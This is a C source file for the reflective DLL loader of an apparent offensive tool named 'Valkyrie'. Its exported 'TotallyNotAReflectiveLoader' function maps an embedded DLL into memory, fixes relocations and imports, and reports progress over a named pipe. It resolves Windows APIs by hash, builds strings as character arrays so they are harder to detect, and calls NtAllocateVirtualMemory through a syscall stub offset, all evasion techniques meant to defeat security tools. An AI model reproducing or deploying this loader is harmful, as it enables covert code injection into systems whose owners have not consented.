#include <stdio.h>
#include <Windows.h>
#include "ReflectiveLoader.h"
#include "..\Shared\Valkyrie.h"

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\
* Loader-friendly functions must either contain no external dependencies or  *
* those external dependencies must be manually defined in ReflectiveLoader.h * 
* and dynamically resolved in TotallyNotAReflectiveLoader() to be available  *
\* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

// Returns a pointer to a string containing Address
CHAR *LoaderAddressToString(LPVOID Address){
    CHAR *StringAddress = (CHAR *)_Malloc(9);
    CHAR Format[] = { '%', 'p', '\n', '\0' };
    _Sprintf(StringAddress, Format, Address);
    return StringAddress;
}

// Writes Message to hPipe, returns the number of BytesWritten
BOOL LoaderWriteToPipe(HANDLE hPipe, CHAR *Message){
    DWORD MessageLength = _Strlen(Message);
    DWORD BytesWritten  = 0;

    _WriteFile(hPipe, Message, MessageLength, &BytesWritten, NULL);

    return (BOOL)BytesWritten;
}

// Process the unloaded PeBase's sections into loaded sections in ReflectiveBase, return TRUE just for fun why not
BOOL ProcessSections(HMODULE ReflectiveBase, HMODULE PeBase){
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)PeBase;
    IMAGE_NT_HEADERS *NtHeader  = (IMAGE_NT_HEADERS *)(DosHeader->e_lfanew + (BYTE *)PeBase);
    
    IMAGE_SECTION_HEADER *CurrentSection = (IMAGE_SECTION_HEADER *)((BYTE *)NtHeader + sizeof(IMAGE_NT_HEADERS));

    for(DWORD i = 0; i < NtHeader->FileHeader.NumberOfSections; i++){
        BYTE *SectionVASpace = (BYTE *)ReflectiveBase + CurrentSection->VirtualAddress;
        BYTE *SectionRawData = (BYTE *)PeBase + CurrentSection->PointerToRawData;
        DWORD RawDataSize    = CurrentSection->SizeOfRawData;

        _Memcpy(SectionVASpace, SectionRawData, RawDataSize);

        DWORD OldProtect, NewProtect = 0;

        if (CurrentSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if(CurrentSection->Characteristics & IMAGE_SCN_MEM_WRITE){
                NewProtect = PAGE_EXECUTE_READWRITE;
            } else if(CurrentSection->Characteristics & IMAGE_SCN_MEM_READ){
                NewProtect = PAGE_EXECUTE_READ;
            } else {
                NewProtect = PAGE_EXECUTE;
            }
        } else if(CurrentSection->Characteristics & IMAGE_SCN_MEM_READ){
            if(CurrentSection->Characteristics & IMAGE_SCN_MEM_WRITE){
                NewProtect = PAGE_READWRITE;
            } else {
                NewProtect = PAGE_READWRITE;
                // Crashes - fix later (or never)
                //NewProtect = PAGE_READONLY;
            }
        } else if(CurrentSection->Characteristics & IMAGE_SCN_MEM_WRITE){
            NewProtect = PAGE_WRITECOPY;
        }

        if(!NewProtect){
            NewProtect = PAGE_NOACCESS;
        }
        _VirtualProtect(SectionVASpace, RawDataSize, NewProtect, &OldProtect);

        CurrentSection++;
    }
    return TRUE;
}

// Processes the relocations for the newly loaded reflective module, also returns TRUE for fun
BOOL ProcessRelocations(HMODULE ReflectiveBase){
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)ReflectiveBase;
    IMAGE_NT_HEADERS *NtHeader  = (IMAGE_NT_HEADERS *)(DosHeader->e_lfanew + (BYTE *)ReflectiveBase);

    ULONGLONG ImageDelta = (ULONGLONG)((BYTE *)ReflectiveBase - NtHeader->OptionalHeader.ImageBase);

    if(ImageDelta){
       IMAGE_BASE_RELOCATION *Relocation = (IMAGE_BASE_RELOCATION *)(NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (BYTE *)ReflectiveBase);
        while(Relocation->VirtualAddress != 0){
            DWORD dwRelocationNumber = (Relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *RelocationEntry = (WORD *)((BYTE *)Relocation + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < dwRelocationNumber; i++){
                WORD RelocationType = RelocationEntry[i] >> 12;
                WORD RelocationOffset = RelocationEntry[i] & 0xFFF;

                if (RelocationType == IMAGE_REL_BASED_DIR64){
                    ULONGLONG *PatchAddress = (ULONGLONG *)((BYTE *)ReflectiveBase + Relocation->VirtualAddress + RelocationOffset);
                    *PatchAddress += ImageDelta;
                }
            }
            Relocation = (IMAGE_BASE_RELOCATION *)((BYTE *)Relocation + Relocation->SizeOfBlock); 
        }
    }

    return TRUE;
}

// Check for '.' in FunctionAddress, indicating a forwader string
BOOL IsForwarder_R(CHAR *FunctionAddress){
    if(_Strchr(FunctionAddress, '.')){
        return TRUE;
    } else {
        return FALSE;
    }
}

// Returns the function address of the forwarder string's corresponding function
FARPROC ProcessForwarder_R(CHAR *FunctionAddress){
    CHAR ForwarderDLLName[128] = { 0 };
    CHAR ForwarderDLLEnd[5] = { '.', 'd', 'l', 'l', '\0' };
    CHAR ForwarderFunctionName[128] = { 0 };

    DWORD ForwarderDot = _Strchr((CHAR *)FunctionAddress, '.') - FunctionAddress;

    _Memcpy((VOID *)ForwarderDLLName, (VOID *)FunctionAddress, ForwarderDot);
    _Memcpy((VOID *)(ForwarderDLLName + ForwarderDot), (VOID *)ForwarderDLLEnd, sizeof(ForwarderDLLEnd));
    _Memcpy((VOID *)ForwarderFunctionName, (VOID *)(FunctionAddress + ForwarderDot + 1), _Strlen((const char *)(FunctionAddress + ForwarderDot + 1)));

    return CustomGetProcAddress(CustomGetModuleHandle(ForwarderDLLName), HashDjb2A(ForwarderFunctionName));
}

// Process the imports for the reflective module, returns TRUE for fun
BOOL ProcessImports(HMODULE ReflectiveBase){
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)ReflectiveBase;
    IMAGE_NT_HEADERS *NtHeader  = (IMAGE_NT_HEADERS *)(DosHeader->e_lfanew + (BYTE *)ReflectiveBase);

    IMAGE_IMPORT_DESCRIPTOR *ImportedLibrary  = (IMAGE_IMPORT_DESCRIPTOR *)(NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (BYTE *)ReflectiveBase);

    while(ImportedLibrary->Name != 0){

        HMODULE LibraryBase = _LoadLibraryA(ImportedLibrary->Name + (BYTE *)ReflectiveBase);

        IMAGE_DOS_HEADER *LibraryDosHeader = (IMAGE_DOS_HEADER *)LibraryBase;
        IMAGE_NT_HEADERS *LibraryNtHeader  = (IMAGE_NT_HEADERS *)(LibraryDosHeader->e_lfanew + (BYTE *)LibraryBase);

        IMAGE_THUNK_DATA *ILT = (IMAGE_THUNK_DATA *)(ImportedLibrary->OriginalFirstThunk + (BYTE *)ReflectiveBase);
        IMAGE_THUNK_DATA *IAT = (IMAGE_THUNK_DATA *)(ImportedLibrary->FirstThunk         + (BYTE *)ReflectiveBase);

        while(IAT->u1.Function != 0){
            if(ILT->u1.Ordinal != 0 && ILT->u1.Ordinal & IMAGE_ORDINAL_FLAG){
                IMAGE_EXPORT_DIRECTORY *LibraryExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(LibraryNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (BYTE *)LibraryBase);
                DWORD  *AddressArray = (DWORD *)(LibraryExportDirectory->AddressOfFunctions + (BYTE *)LibraryBase);
                IAT->u1.Function = (ULONGLONG)(AddressArray[ILT->u1.Ordinal & IMAGE_ORDINAL_FLAG] + (BYTE *)LibraryBase);

            } else {
                IMAGE_IMPORT_BY_NAME *ImportByName = (IMAGE_IMPORT_BY_NAME *)(IAT->u1.AddressOfData + (BYTE *)ReflectiveBase);
                IAT->u1.Function = (ULONGLONG)CustomGetProcAddress(LibraryBase, HashDjb2A(ImportByName->Name));

                if(IsForwarder_R((CHAR *)IAT->u1.Function)){
                    IAT->u1.Function = (ULONGLONG)ProcessForwarder_R((CHAR *)IAT->u1.Function);
                }
            }
            IAT++;
            ILT++;
        }
        ImportedLibrary++;
    }   
    return TRUE;
}

// Kickstarts the reflective loader, loads embedded LdrValkyrie.dll as a reflective module in a remote process
__declspec(dllexport) BOOL TotallyNotAReflectiveLoader(HMODULE ValkyrieBase){
    HANDLE ValkyriePipeHandle = INVALID_HANDLE_VALUE;

    // Position-independent strings
    CHAR PipeName[]                 = { '\\', '\\', '.', '\\', '\\', 'p', 'i', 'p', 'e', '\\', '\\', 'V', 'a', 'l', 'k', 'y', 'r', 'i', 'e', '\0' };
    CHAR MessageIdentifyLoader[]    = { 'V', 'A', 'L', 'K', '-', 'I', 'D', '-', 'L', 'D', 'R', '\0' };
    CHAR MessageConnect[]           = { 'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'L', 'o', 'a', 'd', 'e', 'r', '!', '\n', '\0' };
    CHAR MessageAllocated[]         = { 'M', 'e', 'm', 'o', 'r', 'y', ' ', 'a', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'd', '.', '\n', '\0' };
    CHAR MessageHeadersCopied[]     = { 'P', 'E', ' ', 'h', 'e', 'a', 'd', 'e', 'r', 's', ' ', 'c', 'o', 'p', 'i', 'e', 'd', '.', '\n', '\0' };
    CHAR MessageSectionsCopied[]    = { 'P', 'E', ' ', 's', 'e', 'c', 't', 'i', 'o', 'n', 's', ' ', 'c', 'o', 'p', 'i', 'e', 'd', '.', '\n', '\0' };
    CHAR MessageFinishRelocation[]  = { 'R', 'e', 'l', 'o', 'c', 'a', 't', 'e', 'd', ' ', 'i', 'm', 'a', 'g', 'e', '.', '\n', '\0' };
    CHAR MessageFinishImports[]     = { 'I', 'm', 'p', 'o', 'r', 't', 's', ' ', 'p', 'r', 'o', 'c', 'e', 's', 's', 'e', 'd', '.', '\n', '\0' };
    CHAR MessageLoaderFinish[]      = { 'L', 'o', 'a', 'd', 'e', 'r', ' ', 'd', 'o', 'n', 'e', ',' , ' ', 'p', 'a', 's', 's', 'i', 'n', 'g', ' ', 't', 'o', ' ', 'm', 'o', 'd', 'u', 'l', 'e', '.', '\n', '\n', '\0' };

    _NtFlushInstructionCache = (pNtFlushInstructionCache) CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_NTDLL), HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);

    _LoadLibraryA   = (pLoadLibraryA)   CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_KERNEL32), HASH_FUNC_LOADLIBRARYA);
    _CreateFileA    = (pCreateFileA)    CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_KERNEL32), HASH_FUNC_CREATEFILEA);
    _WriteFile      = (pWriteFile)      CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_KERNEL32), HASH_FUNC_WRITEFILE);
    _GetLastError   = (pGetLastError)   CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_KERNEL32), HASH_FUNC_GETLASTERROR);
    _VirtualProtect = (pVirtualProtect) CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_KERNEL32), HASH_FUNC_VIRTUALPROTECT);
    _CloseHandle    = (pCloseHandle)    CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_KERNEL32), HASH_FUNC_CLOSEHANDLE);

    _Malloc  = (pMalloc)  CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_MSVCRT), HASH_FUNC_MALLOC);
    _Sprintf = (pSprintf) CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_MSVCRT), HASH_FUNC_SPRINTF);
    _Printf  = (pPrintf)  CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_MSVCRT), HASH_FUNC_PRINTF);
    _Strlen  = (pStrlen)  CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_MSVCRT), HASH_FUNC_STRLEN);
    _Memcpy  = (pMemcpy)  CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_MSVCRT), HASH_FUNC_MEMCPY);
    _Strchr  = (pStrchr)  CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_MSVCRT), HASH_FUNC_STRCHR);
    
    for(DWORD i = 0; i < VALKYRIE_PIPE_TIMEOUT; i++){
        ValkyriePipeHandle = _CreateFileA(PipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if(ValkyriePipeHandle != INVALID_HANDLE_VALUE){
            LoaderWriteToPipe(ValkyriePipeHandle, MessageIdentifyLoader);
            LoaderWriteToPipe(ValkyriePipeHandle, MessageConnect);
            break;
        } else {
            if(ValkyriePipeHandle == INVALID_HANDLE_VALUE && (i + 1) == VALKYRIE_PIPE_TIMEOUT){
                return FALSE;
            }
        }
    }

    IMAGE_DOS_HEADER *ValkDosHeader = (IMAGE_DOS_HEADER *)ValkyrieBase;
    IMAGE_NT_HEADERS *ValkNtHeader  = (IMAGE_NT_HEADERS *)(ValkDosHeader->e_lfanew + (BYTE *)ValkyrieBase);

    HMODULE ReflectiveBase  = NULL;
    SIZE_T  ImageSize       = (SIZE_T)ValkNtHeader->OptionalHeader.SizeOfImage;

    LPVOID   SysAddr_NtAllocateVirtualMemory = (LPVOID)((BYTE *)CustomGetProcAddress(CustomGetModuleHandleHash(HASH_DLL_NTDLL), HASH_FUNC_NTALLOCATEVIRTUALMEMORY) + 0x12);
    NTSTATUS Status = Sys_NtAllocateVirtualMemory((HANDLE)-1, &(LPVOID)ReflectiveBase, (ULONG_PTR)NULL, &ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, SysAddr_NtAllocateVirtualMemory);

    LoaderWriteToPipe(ValkyriePipeHandle, MessageAllocated);
    LoaderWriteToPipe(ValkyriePipeHandle, LoaderAddressToString(ReflectiveBase));

    DWORD HeadersSize = ValkNtHeader->OptionalHeader.SizeOfHeaders;
    _Memcpy(ReflectiveBase, ValkyrieBase, HeadersSize);

    LoaderWriteToPipe(ValkyriePipeHandle, MessageHeadersCopied);

    IMAGE_DOS_HEADER *ReflectDosHeader = (IMAGE_DOS_HEADER *)ReflectiveBase;
    IMAGE_NT_HEADERS *ReflectNtHeader  = (IMAGE_NT_HEADERS *)(ReflectDosHeader->e_lfanew + (BYTE *)ReflectiveBase);

    _DllMain = (pDllMain)(ReflectNtHeader->OptionalHeader.AddressOfEntryPoint + (BYTE *)ReflectiveBase);
    
    ProcessSections(ReflectiveBase, ValkyrieBase);
    LoaderWriteToPipe(ValkyriePipeHandle, MessageSectionsCopied);

    ProcessRelocations(ReflectiveBase);
    LoaderWriteToPipe(ValkyriePipeHandle, MessageFinishRelocation);

    ProcessImports(ReflectiveBase);
    LoaderWriteToPipe(ValkyriePipeHandle, MessageFinishImports);

    LoaderWriteToPipe(ValkyriePipeHandle, MessageLoaderFinish);
    _CloseHandle(ValkyriePipeHandle);

    _NtFlushInstructionCache((HANDLE)-1, NULL, 0);
    return _DllMain((HANDLE)-1, DLL_PROCESS_ATTACH, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD fdwReason, LPVOID lpvReserved){
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            ModuleMain();
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
        
        if (lpvReserved != NULL)
        {
            break;
        }
    
        break;
    }
    return TRUE;
}